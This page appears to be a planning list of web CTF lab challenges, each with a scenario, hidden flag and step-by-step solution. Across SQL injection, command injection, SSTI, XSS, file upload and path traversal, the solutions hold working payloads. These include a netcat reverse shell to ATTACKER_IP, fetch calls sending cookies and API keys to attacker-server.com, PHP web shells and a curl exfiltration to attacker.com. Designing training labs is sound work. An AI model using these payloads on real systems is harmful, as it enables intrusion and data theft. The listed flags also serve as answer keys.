---
description: Here is some list of challenges, that could be made and deployed
icon: list-dropdown
---

# CTF Challenges List (Web)

<details>

<summary><strong>SQL Injection</strong> </summary>

#### **Lab 1: The Classic Login Bypass (Easy)**

* **Attack Type:** Union-Based or Authentication Bypass

- **Level:** Easy
- **Scenario:** A simple login page for a "Company Internal Portal". The user is told they are a new intern and need to get into the portal, but they don't have a password yet. The hint is: "What if you could trick the system into thinking you're someone you're not?"
- **Where the Flag is Hidden:** The flag is returned on a successful login.\
  `RAZZ{l0g1n_6yp455}`
- **How to Solve:**
  1. Enter a classic payload in the username field: `' OR '1'='1' --`
  2. This comments out the password check and makes the query always true.
  3. The `UNION SELECT` technique can also be used to retrieve the flag directly if the number of columns is known.



#### Lab 2: Product Search with Data Exfiltration (Easy/Medium)

* **Attack Type:** Union-Based
* **Level:** Easy/Medium
* **Scenario:** An "E-commerce Site" with a search bar to find products. The user's goal is to steal the secret product list (the flag) from the database, which is not displayed on the main page.
* **Where the Flag is Hidden:** The flag is stored as the `name` of a secret product in the same `products_table` (e.g., `"RAZZ{D4t4_Exf1l}"`).
* **How to Solve:**
  1. The attacker must first determine the number of columns in the original query (e.g., `q=' UNION SELECT NULL--`, `q=' UNION SELECT NULL, NULL--`, etc., until no error).
  2. Once they know it's 3 columns, they can exfiltrate the flag: `q=' UNION SELECT 1, name, 3 FROM products_table WHERE name LIKE 'SECRET%' --`
  3. The secret product name (the flag) will appear in the search results.



#### Lab 3: Error-Based Injection for Database Recon (Medium)

* **Attack Type:** Error-Based
* **Level:** Medium
* **Scenario:** A "User Profile Page" that takes a user ID. The page is supposed to be robust and not show data on error, but verbose errors are enabled in `settings.py` (`DEBUG=True`). The goal is to discover the name of the secret table that contains the flag.
* **Where the Flag is Hidden:** The name of the flag is the name of a hidden table (e.g., `secret_flags`). The actual flag is the text: `RAZZ{Err0r_m4st3r}`.
* **How to Solve:**
  1. The attacker causes an error that reveals the database structure. For SQLite: `id=1 AND (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%') --`
  2. This might cause an error like `"no such column: tbl_name"` or, if crafted correctly, will dump the table names. The attacker needs to guess or use a subquery to extract the `tbl_name` one character at a time.
  3. The payload `id=1 AND (SELECT 1 FROM secret_flags)` would confirm the table's existence by throwing an error if it exists (because `SELECT 1` has a different number of columns).



#### Lab 4: Blind Boolean-Based Injection (Medium)

* **Attack Type:** Blind Boolean-Based
* **Level:** Medium
* **Scenario:** A "Blog" where some posts are only visible to admins. A non-admin user clicks on a post and sees "Post not found." The goal is to determine the admin's password character by character.
* **Where the Flag is Hidden:** The flag is the admin's hashed password (e.g., `RAZZ{pbkdf2_sha256$60000$abc123...}`). The attacker must exfiltrate it.
* **How to Solve:**
  1. The page gives a binary response: "Post found" (if `is_public` is True) or "Post not found" (if it doesn't exist or `is_public` is False).
  2. The attacker uses this to ask True/False questions about the data. For example, to check the first character of the admin's password: `id=1 AND (SELECT SUBSTR(password, 1, 1) FROM auth_user WHERE is_superuser=1) = 'a'`
  3. If the post is visible, the guess ('a') is correct. If they get "Post not found," it's wrong. They then iterate through all characters and positions to slowly reconstruct the full hash (the flag).



#### Lab 5: Time-Based Blind Injection (Medium)

* **Attack Type:** Time-Based Blind
* **Level:** Medium
* **Scenario:** A "REST API Endpoint" for checking stock levels. It returns a simple JSON response: `{"in_stock": true}` or `{"in_stock": false}`. There is no other feedback. The goal is to extract the version of the database software.

- **Where the Flag is Hidden:** The flag is the database version (e.g., `RAZZ{SQLite_3.45.1}`).
- **How to Solve:**
  1. Since there is no visible error or data difference, the attacker must use a time delay.
  2. For SQLite, a payload like this is used: `product_id=' AND (CASE WHEN (SELECT substr(sqlite_version(),1,1)='3') THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2)))) ELSE 1 END) --`
  3. A more universal, simpler payload for testing might be: `product_id='; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --` (for PostgreSQL).
  4. The attacker measures the response time. If the response is delayed by 10 seconds, the condition (`1=1`) is true. They can then change the condition to ask about each character of the `sqlite_version()` string, exfiltrating it one character at a time based on delayed responses.



#### **Lab 6: Week Hashing**

* **Attack Type:** Weak Cryptography / Hash Cracking
* **Level:** Easy/Medium
* **Scenario:** You are trying to access the admin panel of "CryptoCorp's" internal system. You've managed to leak a database fragment containing a user's password hash. The hint says: "The developer thought using MD5 was a great idea for speed."
* **Where the Flag is Hidden:** The flag is displayed after successfully logging into the admin account using the cracked password.
* **How to Solve:**
  1. The user finds the hash `e6b061c9677b4e6e7d6925d6c269ac47` (which is the MD5 hash of `secret123`) in a publicly accessible `/debug` page or through a basic SQL injection (`' UNION SELECT 1,password,3 FROM users--`).
  2. The attacker recognizes the format as a 32-character MD5 hash.
  3. The attacker uses a tool like `hashcat`, `john`, or an online rainbow table (e.g., CrackStation) to crack the hash.
  4. **Payload:** The cracked password is `secret123`.
  5. The attacker logs into the admin account (`admin : secret123`) to access the dashboard and retrieve the flag.
* **Flag:** `RAZZ{md5_i5_n0t_5ecur3}`

</details>

<details>

<summary><strong>Command Injection (OS Injection)</strong></summary>

#### Lab 1: The Basic Network Ping Utility (Easy)

* **Attack Type:** Basic Command Injection
* **Level:** Easy
* **Scenario:** A "Network Diagnostics" page on an internal IT dashboard. Users, like new helpdesk technicians, are allowed to ping hosts to check connectivity. The goal is to break out of the ping command and read a secret file on the system.
* **Where the Flag is Hidden:** The flag is in a file named `/etc/secret_flag.txt`.
* **How to Solve:**
  1. The user can terminate the `ping` command and execute a new one.
  2. **Payload:** `8.8.8.8; cat /etc/secret_flag.txt`
  3. The resulting command becomes `ping -c 4 8.8.8.8; cat /etc/secret_flag.txt`, which executes both commands sequentially. The contents of the flag file will be displayed after the ping output.



#### Lab 2: DNS Lookup Tool with Filter Bypass (Easy/Medium)

* **Attack Type:** Command Injection with Filter Bypass
* **Level:** Easy/Medium
* **Scenario:** A public "DNS Lookup" tool on a network website. The developer tried to improve security by banning semicolons `;` and ampersands `&`. The goal is to bypass these filters.
* **Where the Flag is Hidden:** The flag is in an environment variable: `SECRET_FLAG`.
* **How to Solve:**
  1. The attacker must use a different command separator that isn't filtered.
  2. **Payload 1 (Unix):** `example.com && echo $SECRET_FLAG`
  3. **Payload 2 (Unix):** `example.com || echo $SECRET_FLAG` (This works because if `nslookup` fails, the second command runs)
  4. The resulting command becomes `nslookup example.com && echo $SECRET_FLAG`, which will print the flag's value if the `nslookup` is successful.



#### Lab 3: File Downloader with Injection in a Subprocess (Medium)

* **Attack Type:** Command Injection (Argument Injection)
* **Level:** Medium
* **Scenario:** A "Secure File Downloader" service. The user provides a URL, and the server uses `curl` to download the file to a restricted directory. The goal is to abuse `curl`'s arguments to write a file somewhere else or read a local file.
* **Where the Flag is Hidden:** The flag is in a file that the web server user can read: `/app/config/credentials.prod.ini`.
* **How to Solve:**
  1. The attacker can use `curl`'s own features to overwrite the destination (`-o`) or read local files.
  2. **Payload to read local file:** `file:///app/config/credentials.prod.ini -o /tmp/downloads/stolen.ini`
  3. The final command becomes:\
     `curl -o /tmp/downloads/output.file file:///app/config/credentials.prod.ini -o /tmp/downloads/stolen.ini`
  4. `curl` will process both `-o` flags. It will first try to download the local file and save it to `output.file`, but then it will save the same content to `stolen.ini`. The attacker can then access the stolen file if they know its name, or use another injection to list the directory. A more direct way is to use the `-K` flag to read a local file and exfiltrate its contents via a DNS query or by writing it to a known location.



#### Lab 4: Server Health Dashboard (Blind Time-Based) (Medium)

* **Attack Type:** Blind Command Injection
* **Level:** Medium
* **Scenario:** An admin "Server Health" dashboard that runs various system commands (like `vmstat`, `free`) and displays the output. The output of the command is not shown to the user, but the page takes longer to load if a command is slow. The goal is to prove blind injection by triggering a time delay.
* **Where the Flag is Hidden:** There is no output to exfiltrate. The goal is to prove the vulnerability exists. The "flag" is the successful detection of the blind injection. The success message could be: `RAZZ{Blind_Time_Delay_123}`
* **How to Solve:**
  1. The attacker must use a time-based payload to confirm the injection.
  2. **Payload:** `type=disk'; sleep 5; #`
  3. The resulting command becomes `/bin/bash -c 'df -h'; sleep 5; #'`. The `sleep 5` command will execute, causing a 5-second delay in the server's response. This confirms the ability to execute arbitrary commands, even if the output is blind.



#### Lab 5: SVG Thumbnail Generator (Medium - Polyglot Attack)

* **Attack Type:** Command Injection (Argument Injection + Input Filter Bypass)
* **Level:** Medium
* **Scenario:** A web app allows users to upload an SVG image, which is then converted to a PNG thumbnail using ImageMagick's `convert` command. The goal is to exploit a command injection flaw hidden within the SVG file itself to read a system file.
* **Where the Flag is Hidden:** The flag is in the source code of the view itself: `/app/views.py`
* **How to Solve:**
  1. The attack is multi-step. The user must upload a specially crafted SVG file.
  2. **Step 1: Create a malicious SVG.** The SVG can contain a payload that leverages ImageMagick's ability to "delegate" commands or, more simply, use a filename that includes a shell injection.
  3. **Step 2: Craft the filename.** Save the SVG with a name like `exploit.svg"; cat /app/views.py > /tmp/views.py; "`.
  4. When this file is uploaded and processed, the command becomes:\
     `convert /tmp/exploit.svg"; cat /app/views.py > /tmp/views.py; ".png /tmp/exploit.svg"; cat /app/views.py > /tmp/views.py; ".png`
  5. This messy command will likely fail for `convert`, but the injected `cat` command in the middle will execute, copying the vulnerable source code to a location in `/tmp` where the attacker might be able to guess its name and download it. This is a classic polyglot attack (a file that is both a valid SVG and a weaponized payload).

</details>

<details>

<summary><strong>Template Injection (SSTI – Server-Side Template Injection)</strong></summary>

#### Lab 1: The "Custom Greeting" Page (Easy)

* **Attack Type:** Basic SSTI
* **Level:** Easy
* **Scenario:** A marketing page for a "Personalized Email Campaign" tool. Users can enter their name to see a preview of a greeting email. The developer thought it would be clever to dynamically generate the greeting using the template engine.
* **Where the Flag is Hidden:** The flag is in the application's environment variables (`SECRET_FLAG`).
* **How to Solve:**
  1. The user can break out of the template expression and inject their own template code.
  2. **Payload:** `name={{ 7 * 7 }}` will output `Hello, 49!`, confirming injection.
  3. **RCE Payload (Django <1.8, or with old syntax enabled):** `name={{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/environment', shell=True, stdout=-1).communicate() }}`
  4. The attacker would iterate through the `__subclasses__()` index to find `subprocess.Popen` (often index 396 or similar) to execute system commands and read the environment variable.



#### Lab 2: Vulnerable "User Feedback" Dashboard (Easy/Medium)

* **Attack Type:** SSTI in a Third-Party Component
* **Level:** Easy/Medium
* **Scenario:** An internal "Customer Feedback Dashboard" used by the support team. This dashboard uses a common open-source component for rendering report summaries. A popular real-world example is **Apache Superset** (CVE-2023-27524 was an SSTI vulnerability in a featured chart). The user can create a chart where the title is rendered unsafely.
* **Where the Flag is Hidden:** The flag is the application's secret key (`settings.SECRET_KEY`).
* **How to Solve:**
  1. The attacker POSTs a JSON configuration where the `title` is a malicious template string and provides the context variable needed for the exploit.
  2.  **Payload:**

      json

      ```json
      {
        "title": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('echo $SECRET_KEY', shell=True, stdout=-1).communicate() }}",
        "customer_name": "ignored"
      }
      ```
  3. The response will include the rendered title, which contains the output of the command, exposing the `SECRET_KEY` (the flag).\


#### Lab 3: CMS Page Rendering Engine (Medium)

* **Attack Type:** SSTI leading to RCE
* **Level:** Medium
* **Scenario:** A simple Content Management System (CMS) where users with "admin" privileges can create new web pages and use "dynamic content" in them. A real-world analogy is **WordPress plugins** that improperly handle shortcodes, or custom CMS engines. The goal is to gain shell access.
* **Where the Flag is Hidden:** The flag is on the server's filesystem at `/home/django/flag.txt`.
* **How to Solve:**
  1. An admin user (or an attacker who has compromised an admin account) can inject template code into the page content.
  2. They can write a template payload that executes commands to get a reverse shell.
  3.  **Reverse Shell Payload (Python-based):**

      python

      ```json
      {% with '' as __py_template_string_1__ %}
        {% with ''.__class__.__mro__[1].__subclasses__()[396]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f', shell=True, stdout=-1) as __py_template_string_2__ %}
        {% endwith %}
      {% endwith %}
      ```
  4. After saving this page, simply visiting it will execute the payload, giving the attacker a reverse shell connection to their machine (`ATTACKER_IP`), allowing them to `cat /home/django/flag.txt`.



#### Lab 4: PDF Report Generator (Medium - Filter Bypass)

* **Attack Type:** SSTI with limited character set or filters
* **Level:** Medium
* **Scenario:** An application feature that generates PDF reports from templates. A common real-world example is **WeasyPrint** or **wkhtmltopdf** workflows where HTML templates are used. The user can control a "company name" field. The developer has filtered `{{` and `}}` to prevent SSTI.

- **Where the Flag is Hidden:** The flag is the value of `settings.SECRET_KEY`.
- **How to Solve:**
  1. The attacker must bypass the filter. In Django templates, the `{%` and `%}` syntax can also be used for attacks, not just `{{` and `}}`.
  2. **Payload:** `company={% debug %}`
  3. The `{% debug %}` tag will output a massive amount of debugging information, including the entire context and the `SECRET_KEY` from the `settings` module. The attacker can then easily find the flag in the output.



#### Lab 5: Email Template Editor (Medium/Hard - Sandbox Escape)

* **Attack Type:** Advanced SSTI (Sandbox Escape)
* **Level:** Medium/Hard
* **Scenario:** An "Email Template Editor" in a SaaS application (like **SendGrid, Mailchimp, or a custom CRM**). Users can create custom email templates using a limited set of template variables (`{{ user.name }}`). The application uses a sandboxed template environment, but it's misconfigured. The goal is to break out of the sandbox.

- **Where the Flag is Hidden:** The flag is in the database, accessible only via a Django model: `AppSettings.objects.get().flag_value`.
- **How to Solve:**
  1. This is a complex attack requiring research into the specific sandbox. The attacker must probe the environment to see what functions/classes are available.
  2. **Probing Payload:** `{{ ''.__class__ }}` - does it return `str` or is it blocked?
  3. If the sandbox is weak, standard Django SSTI payloads might work. If it's stronger, the attacker might need to abuse the `my_custom_lib` if it exposes dangerous functions, or find a flaw in the sandbox itself to access the underlying Python interpreter and import `os` or `subprocess` directly. Successfully doing so would allow them to run commands and exfiltrate the flag from the database.

</details>

<details>

<summary><strong>Cross-Site Scripting (XSS)</strong></summary>

#### Lab 1: Reflected XSS in Search Engine (Easy)

* **Attack Type:** Reflected XSS
* **Level:** Easy
* **Scenario:** A simple website with a search functionality. The search term is echoed back on the results page with the message "Results for: \[search term]". This is a classic reflected XSS scenario.

- **Where the Flag is Hidden:** The flag is in the user's cookie (`document.cookie`). The goal is to steal it.
- **How to Solve:**
  1. The attacker crafts a URL with a malicious script as the search parameter.
  2. **Payload:** `http://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>`
  3. When the victim clicks this link, the script executes in their browser, stealing their session cookie. The attacker would use a payload that sends the cookie to their own server: `<script>fetch('https://attacker-server.com/steal?cookie=' + document.cookie)</script>`.



#### Lab 2: Stored XSS in User Comment System (Easy/Medium)

* **Attack Type:** Stored XSS
* **Level:** Easy/Medium
* **Scenario:** A blog platform that allows users to comment on posts. The comments are not sanitized properly and are stored in the database. Every time the blog post is viewed, the malicious comment is loaded and executed for all visitors. A real-world analogy is any forum or social media comment section with poor filtering

- **Where the Flag is Hidden:** The flag is the content of a hidden HTML element only visible to authenticated users (`<div id="user-api-key">RAZZ{Stored_XSS_123}</div>`). The goal is to exfiltrate this data.

* **How to Solve:**
  1. The attacker posts a comment containing a malicious script.
  2.  **Payload:**

      html

      ```javascript
      <script>
      var apiKey = document.getElementById('user-api-key').innerText;
      fetch('https://attacker-server.com/log?key=' + apiKey);
      </script>
      ```
  3. This script waits for any logged-in user to view the blog post. When they do, it steals their hidden API key (the flag) and sends it to the attacker's server.



#### Lab 3: DOM-Based XSS in Dynamic Theme Switcher (Medium)

* **Attack Type:** DOM-Based XSS
* **Level:** Medium
* **Scenario:** A modern web app has a client-side theme switcher. The selected theme is read from the URL hash (e.g., `#theme=dark`) and written directly into the DOM using `innerHTML` without sanitization. This is a pure client-side vulnerability; the server is not involved.

- **Where the Flag is Hidden:** The flag is in the browser's Local Storage (`localStorage.getItem('flag')`).
- **How to Solve:**
  1. The attacker crafts a URL where the `theme` parameter is not a color, but a script.
  2. **Payload:** `http://vulnerable-site.com/theme#theme=red;</style><script>alert(localStorage.getItem('flag'))</script>`
  3. This payload first closes the `<style>` tag and then injects a new `<script>` tag. When the victim visits this URL, the malicious script executes, accessing Local Storage and exfiltrating the flag. The server never sees the payload; the attack happens entirely in the victim's browser.



#### Lab 4: Reflected XSS with Basic Filter Bypass (Medium)

* **Attack Type:** Reflected XSS (Filter Bypass)
* **Level:** Medium
* **Scenario:** A "Contact Us" form. After submission, a thank you page displays the user's name. The developer implemented a naive filter that only blacklists the word `<script>`.

- **Where the Flag is Hidden:** The flag is the value of a custom HTTP header (`X-Flag`) set by the server on this page.
- **How to Solve:**
  1. The attacker must bypass the naive filter. There are many ways to execute JavaScript without a `<script>` tag (HTML tags with event handlers like `onerror`, `onload`, etc.).
  2. **Payload 1 (using img tag):** `name=<img src="x" onerror="alert('XSS')">`
  3. **Payload 2 (using iframe):** `name=<iframe onload="alert('XSS')"></iframe>`
  4. The attacker would use a payload to read the headers, which is non-trivial from JavaScript but possible if the server reflects them or with `fetch()` and `include: 'credentials'`. A simpler lab variant could have the flag in the HTML body. The key lesson is bypassing the weak filter.



#### Lab 5: Stored XSS in User Profile (Medium - CSP Bypass)

* **Attack Type:** Stored XSS (with a CSP in place)
* **Level:** Medium
* **Scenario:** A social media platform allows users to set a "Bio" on their profile. The input is sanitized on the server to remove `<script>` tags, but the developer allows some safe HTML like `<img>` tags to enable formatting. The site also has a **Content Security Policy (CSP)** that blocks inline scripts, only allowing scripts from `trusted-cdn.com`.
*   **Vulnerable Code (views.py with sanitization):**

    python:

    ```python
    from django.utils.html import strip_tags, escapejs
    import bleach # A common HTML sanitization library

    def save_profile(request):
        if request.method == 'POST':
            bio = request.POST.get('bio', '')
            # Allow some tags for formatting, but supposedly safe ones.
            allowed_tags = bleach.sanitizer.ALLOWED_TAGS + ['img', 'p', 'br']
            cleaned_bio = bleach.clean(bio, tags=allowed_tags, strip=True)
            
            profile = request.user.profile
            profile.bio = cleaned_bio
            profile.save()
            return HttpResponseRedirect('/profile/')
    ```

    The CSP header is set in `settings.py`:

    python:

    ```python
    CSP_DEFAULT_SRC = ("'self'",)
    CSP_SCRIPT_SRC = ("'self'", "https://trusted-cdn.com")
    # This policy prevents inline scripts like <script>alert(1)</script> from executing.
    ```
* **Where the Flag is Hidden:** The flag is the content of the user's private messages, accessible via an API call to `/api/private-messages` (which returns JSON).
* **How to Solve:**
  1. The attacker needs to bypass the CSP. Since `img` tags are allowed, they can use the `onerror` event handler. However, CSP blocks _inline event handlers_.
  2. The solution is to host a malicious script on a domain that is allowed by the CSP (like `trusted-cdn.com`). If the attacker can find an open redirect or upload a file on that domain, they can use it. A more common bypass is if the CSP is misconfigured to allow `data:` URIs or a common CDN like `ajax.googleapis.com` which hosts AngularJS.
  3.  **Payload using a trusted CDN (if Angular is hosted there):**

      html

      ```
      <img src="x" ng-on-error="fetch('/api/private-messages').then(r=>r.json()).then(data=>fetch('https://attacker.com/?='+btoa(JSON.stringify(data))))">
      ```
  4. This complex payload uses AngularJS attributes (`ng-on-error`) to execute code if the image fails to load. It then reads the private messages and exfiltrates them to the attacker's server. This lab teaches advanced concepts of CSP bypass and the dangers of allowing any HTML tags.\


</details>

<details>

<summary><strong>File Upload Vulnerabilities</strong></summary>

#### Lab 1: Basic Image Upload to Web Shell (Easy)

* **Attack Type:** unrestricted file upload
* **Level:** Easy
* **Scenario:** A social media profile page allows users to upload an avatar image. The application checks the _client-side_ `Content-Type` header but performs no further validation on the server. The files are stored in a web-accessible directory.

- **Where the Flag is Hidden:** The flag is on the server's filesystem at `/home/django/flag.txt`.
- **How to Solve:**
  1. The attacker creates a file named `shell.php` containing PHP code: `<?php system($_GET['cmd']); ?>`.
  2. They use a tool like Burp Suite to intercept the upload request and change the `Content-Type` header to `image/png`.
  3. The server accepts the file and saves it to the web root (e.g., `MEDIA_ROOT/`).
  4. The attacker visits `http://vulnerable-site.com/media/shell.php?cmd=cat /home/django/flag.txt`.
  5. The server executes the PHP code, running the `cat` command and displaying the flag.



#### Lab 2: Bypassing Blacklist Filters (Easy/Medium)

* **Attack Type:** File upload with blacklist bypass
* **Level:** Easy/Medium
* **Scenario:** A document sharing service for a company intranet. The developer has implemented a blacklist of dangerous extensions (e.g., `.php`, `.py`, `.exe`). The goal is to bypass this list.

- **Where the Flag is Hidden:** The flag is in the database, accessible via a Django command: `python manage.py get_flag`.
- **How to Solve:**
  1. The attacker must find an alternative extension that the server will still execute. For Apache servers, `.php5`, `.phtml`, `.phps` are common backups.
  2. **Payload:** Rename the `shell.php` file to `shell.phtml` and upload it.
  3. If the server is configured to execute `.phtml` as PHP, the web shell will work. The attacker can then use the shell to run the Django command: `python manage.py get_flag`.



#### Lab 3: RCE via Polyglot JPEG/PHP File (Medium)

* **Attack Type:** File upload with type validation bypass
* **Level:** Medium
* **Scenario:** A meme generator site is stricter. It uses Python's `imghdr` or `filemagic` library to validate the file's _actual_ content, not just its extension or headers. It only allows genuine image files.

- **Where the Flag is Hidden:** The flag is the SSH private key of the `django` user: `/home/django/.ssh/id_rsa`.
- **How to Solve:**
  1. The attacker must create a **polyglot file** a file that is both a valid JPEG and a valid PHP script.
  2. **Using `exiftool`:**\
     `exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate_image.jpg`
  3. This injects the PHP code into the image's metadata. The `imghdr.what()` function will still recognize the file as a valid `jpeg`.
  4. The server saves it as `meme.jpg`. The attacker then visits the file directly. If the server is misconfigured (e.g., if Apache's `mod_php` is active and processes every file, or if an `AddHandler` directive exists for `.jpg` files), the PHP code in the comment will execute.
  5. The attacker uses the shell to read the SSH key: `http://vulnerable-site.com/media/meme.jpg?cmd=cat /home/django/.ssh/id_rsa`



#### Lab 4: Zip Slip + Zip Upload Leading to RCE (Medium)

* **Attack Type:** Archive upload (Zip Slip) + Template overwrite
* **Level:** Medium
* **Scenario:** A website theme marketplace. Users can upload a `.zip` file containing HTML/CSS/JS templates for review. The application extracts the zip file on the server.

- **Where the Flag is Hidden:** The goal is not to read a file but to achieve RCE. The flag is the output of the `id` command.
- **How to Solve:**
  1. The attacker creates a malicious zip file containing a file with a path traversal filename: `../../../../../../var/www/html/shell.php`.
  2. The content of `shell.php` is the standard web shell: `<?php system($_GET['cmd']); ?>`.
  3. When the application extracts the zip, the `../../` sequences cause the file to be written _outside_ the intended `extracted_themes` directory and into the main web root (`/var/www/html/`).
  4. The attacker then visits `http://vulnerable-site.com/shell.php?cmd=id` to execute commands and get the flag.



#### Lab 5: Race Condition in Malware Scan & Delete (Medium/Hard)

* **Attack Type:** Time-of-Check Time-of-Use (TOCTOU) Race Condition
* **Level:** Medium/Hard
* **Scenario:** A secure document processing service boasts an advanced feature: all uploaded files are virus-scanned. If a file is found to be malicious, it is deleted. The application uses a popular antivirus CLI tool.

- **Where the Flag is Hidden:** The flag is the output of the command `whoami` and `hostname`, proving execution context.
- **How to Solve:**
  1. The attacker uploads a web shell (e.g., `shell.php`).
  2. The server saves the file and immediately responds to the user.
  3. There is a 2-second window (or more, depending on server load) where the file exists on disk but hasn't been scanned and deleted yet.
  4. The attacker writes a script that automatically and rapidly floods the server with requests to the URL of the uploaded shell the moment after the upload succeeds.
  5.  **Payload (Automated):**

      bash

      ```bash
      # After uploading shell.php, quickly run this in a loop:
      for i in {1..100}; do
          curl "http://vulnerable-site.com/media/shell.php?cmd=whoami" &
      done
      ```
  6. Some of these requests will hit the server in the small time gap _after_ the file is saved but _before_ the antivirus deletes it, allowing the command to execute. The attacker wins the race.

</details>

<details>

<summary><strong>Other File Handling Exploits</strong></summary>

#### Lab 1: LFI + Path Traversal in Template Inclusion (Medium)

* **Vulnerabilities:** Local File Inclusion (LFI) via Path Traversal
* **Scenario:** A "Help Center" page has a feature to display documentation for different product modules. The module name is taken from the URL parameter and included directly into the template.

- **Where the Flag is Hidden:** The flag is in the Django application's secret configuration file: `/app/myproject/settings_secret.py`.
- **How to Solve:**
  1. The attacker uses path traversal to escape the `help/` directory.
  2. **Payload:** `http://vulnerable-site.com/help?module=../../../../myproject/settings_secret%00`
  3. The `%00` (null byte) might be needed to cut off the `.html` extension if the server doesn't strip it automatically. Modern Django may be immune to null byte, so the attacker might need to find a way to read the file without the extension or use PHP filters if on a PHP server (this lab assumes a misconfiguremed setup or a similar pattern in another template engine). The key is the path traversal to include a non-template file



#### Lab 2: Forced Download + Path Traversal (Easy)

* **Vulnerabilities:** Unrestricted File Download (Forced Download) + Path Traversal
* **Scenario:** A simple view allows users to download their own uploaded files by filename. The code checks if the file exists in the upload directory but does not validate the filename for path traversal.

- **Where the Flag is Hidden:** The flag is at `/var/backups/app.db`.
- **How to Solve:**
  1. The attacker uses path traversal to download any file on the system.
  2. **Payload:** `http://vulnerable-site.com/download?file=../../../../var/backups/app.db`
  3. The `os.path.join` creates the path `/opt/app/uploads/../../../../var/backups/app.db`, which normalizes to `/var/backups/app.db`.
  4. The weak `startswith` check passes because the constructed path _does_ start with `/opt/app/uploads/` before normalization.
  5. The file is found and downloaded by the browser. This lab highlights the importance of normalizing the path _before_ performing security checks.



#### Lab 3: LFI to RFI via PHP Wrapper (Medium/Hard - PHP Context)

* **Vulnerabilities:** LFI escalated to RFI
* **Scenario:** The application is running on a server with PHP (perhaps a legacy service). It has a standard LFI vulnerability. The PHP configuration has `allow_url_include` set to `On` (this is rare and unsafe, making it a good lab scenario).

- **Where the Flag is Hidden:** The goal is RCE. The flag is on a remote server controlled by the attacker.
- **How to Solve:**
  1. The attacker cannot directly do RFI because they control only part of the filename (`.php` is appended).
  2. They use a **PHP wrapper** to turn the LFI into an RFI. The `php://input` wrapper allows them to include the raw POST data as PHP code.
  3. **Step 1:** `http://vulnerable-php-site.com/index.php?page=php://input`
  4. **Step 2:** The attacker sends a POST request to that URL, with the body containing PHP code: `<?php system('curl http://attacker.com/?flag=$(cat /flag.txt)'); ?>`
  5. The server includes the `php://input` "file", which is the POST body, and executes the PHP code within it. This code exfiltrates the flag to the attacker's server. This demonstrates how a simple LFI can become a critical RCE under specific conditions.

</details>
